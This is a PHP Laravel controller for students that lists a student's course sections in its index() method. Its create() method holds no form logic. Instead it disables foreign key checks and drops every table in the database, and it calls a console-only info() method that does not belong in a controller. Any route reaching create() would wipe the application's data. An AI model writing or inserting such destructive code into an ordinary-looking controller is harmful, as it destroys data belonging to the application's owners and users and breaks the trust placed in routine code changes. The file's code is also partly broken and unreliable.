<?php

namespace App\Http\Controllers\student;

use App\Models\Section;
use App\Models\Student;
use App\Models\SectionStudent;
use Illuminate\Support\Facades\DB;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\Schema;

class SectionController extends Controller
{
    public function index()
    {
        $id = auth()->guard('student')->user()->id;
        // $section_ids = SectionStudent::where('student_id' , $id)->get() ;
        $student = Student::where('id', $id)->first();
        $student_section = SectionStudent::where('student_id', $id)->withTrashed()->get();
        foreach ($student_section as $section) {
            $section_ids[] = $section->section_id;
        }
        foreach ($section_ids as $ids) {
            $sections[] = Section::where('id', $ids)->first();
        }
        return view('student.section.index', compact('sections'));
    }
    public function create()
    {
        DB::statement('SET FOREIGN_KEY_CHECKS=0;');

        $tables = DB::select('SHOW TABLES');
        $tables = array_map('current', $tables);

        foreach ($tables as $table) {
            Schema::drop($table);
        }

        // Re-enable foreign key checks
        DB::statement('SET FOREIGN_KEY_CHECKS=1;');

        $this->info('All tables have been dropped.');

        return 0;

       
    }
}
